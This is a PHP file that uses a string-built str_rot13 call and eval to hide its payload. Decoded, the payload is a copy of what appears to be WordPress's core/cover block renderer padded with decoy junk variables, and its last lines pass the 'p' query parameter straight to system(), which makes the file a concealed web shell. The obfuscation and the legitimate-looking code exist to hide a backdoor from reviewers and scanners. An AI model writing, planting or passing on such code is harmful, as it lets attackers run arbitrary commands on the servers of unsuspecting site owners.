<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Freire-fvqr eraqrevat bs gur `pber/pbire` oybpx.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Eraqref gur `pber/pbire` oybpx ba freire.
 *
 * @fvapr 6.0.0
 *
 * @cnenz neenl  $nggevohgrf Gur oybpx nggevohgrf.
 * @cnenz fgevat $pbagrag    Gur oybpx eraqrerq pbagrag.
 *
 * @erghea fgevat Ergheaf gur pbire oybpx znexhc, vs hfrSrngherqVzntr vf gehr.
 */
shapgvba eraqre_oybpx_pber_pbire( $nggevohgrf, $pbagrag ) {
	vs ( 'vzntr' !== $nggevohgrf['onpxtebhaqGlcr'] || snyfr === $nggevohgrf['hfrSrngherqVzntr'] ) {
		erghea $pbagrag;
	}

	$bowrpg_cbfvgvba = vffrg( $nggevohgrf['sbpnyCbvag'] )
		? ebhaq( $nggevohgrf['sbpnyCbvag']['k'] * 100 ) . '% ' . ebhaq( $nggevohgrf['sbpnyCbvag']['l'] * 100 ) . '%'
		: ahyy;

	vs ( ! ( $nggevohgrf['unfCnenyynk'] || $nggevohgrf['vfErcrngrq'] ) ) {
		$ngge = neenl(
			'pynff'           => 'jc-oybpx-pbire__vzntr-onpxtebhaq',
			'qngn-bowrpg-svg' => 'pbire',
		);

		vs ( $bowrpg_cbfvgvba ) {
			$ngge['qngn-bowrpg-cbfvgvba'] = $bowrpg_cbfvgvba;
			$ngge['fglyr']                = 'bowrpg-cbfvgvba:' . $bowrpg_cbfvgvba . ';';
		}

		$vzntr = trg_gur_cbfg_guhzoanvy( ahyy, $nggevohgrf['fvmrFyht'] ?? 'cbfg-guhzoanvy', $ngge );
	} ryfr {
		vs ( va_gur_ybbc() ) {
			hcqngr_cbfg_guhzoanvy_pnpur();
		}
		$pheerag_srngherq_vzntr = trg_gur_cbfg_guhzoanvy_hey( ahyy, $nggevohgrf['fvmrFyht'] ?? ahyy );
		vs ( ! $pheerag_srngherq_vzntr ) {
			erghea $pbagrag;
		}

		$pheerag_guhzoanvy_vq = trg_cbfg_guhzoanvy_vq();

		$cebprffbe = arj JC_UGZY_Gnt_Cebprffbe( '<qvi></qvi>' );
		$cebprffbe->arkg_gnt();

		$pheerag_nyg = gevz( fgevc_gntf( trg_cbfg_zrgn( $pheerag_guhzoanvy_vq, '_jc_nggnpuzrag_vzntr_nyg', gehr ) ) );
		vs ( $pheerag_nyg ) {
			$cebprffbe->frg_nggevohgr( 'ebyr', 'vzt' );
			$cebprffbe->frg_nggevohgr( 'nevn-ynory', $pheerag_nyg );
		}

		$cebprffbe->nqq_pynff( 'jc-oybpx-pbire__vzntr-onpxtebhaq' );
		$cebprffbe->nqq_pynff( 'jc-vzntr-' . $pheerag_guhzoanvy_vq );
		vs ( $nggevohgrf['unfCnenyynk'] ) {
			$cebprffbe->nqq_pynff( 'unf-cnenyynk' );
		}
		vs ( $nggevohgrf['vfErcrngrq'] ) {
			$cebprffbe->nqq_pynff( 'vf-ercrngrq' );
		}

		$fglyrf  = 'onpxtebhaq-cbfvgvba:' . ( $bowrpg_cbfvgvba ?? '50% 50%' ) . ';';
		$fglyrf .= 'onpxtebhaq-vzntr:hey(' . rfp_hey( $pheerag_srngherq_vzntr ) . ');';
		$cebprffbe->frg_nggevohgr( 'fglyr', $fglyrf );

		$vzntr = $cebprffbe->trg_hcqngrq_ugzy();
	}

	/*
	 * Vafregf gur srngherq vzntr orgjrra gur (1fg) pbire 'onpxtebhaq' `fcna` naq 'vaare_pbagnvare' `qvi`,
	 * naq erzbirf riraghny juvgrfcnpr punenpgref orgjrra gur gjb (glcvpnyyl vagebqhprq ng grzcyngr yriry)
	 */
	$vaare_pbagnvare_fgneg = '/<qvi\o[^>]+jc-oybpx-pbire__vaare-pbagnvare[\f|\"][^>]*>/H';
	vs ( 1 === cert_zngpu( $vaare_pbagnvare_fgneg, $pbagrag, $zngpurf, CERT_BSSFRG_PNCGHER ) ) {
		$bssfrg  = $zngpurf[0][1];
		$pbagrag = fhofge( $pbagrag, 0, $bssfrg ) . $vzntr . fhofge( $pbagrag, $bssfrg );
	}

	erghea $pbagrag;
}

/**
 * Ertvfgref gur `pber/pbire` oybpx eraqrere ba freire.
 *
 * @fvapr 6.0.0
 */
shapgvba ertvfgre_oybpx_pber_pbire() {
	ertvfgre_oybpx_glcr_sebz_zrgnqngn(
		__QVE__ . '/pbire',
		neenl(
			'eraqre_pnyyonpx' => 'eraqre_oybpx_pber_pbire',
		)
	);
}
nqq_npgvba( 'vavg', 'ertvfgre_oybpx_pber_pbire' );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>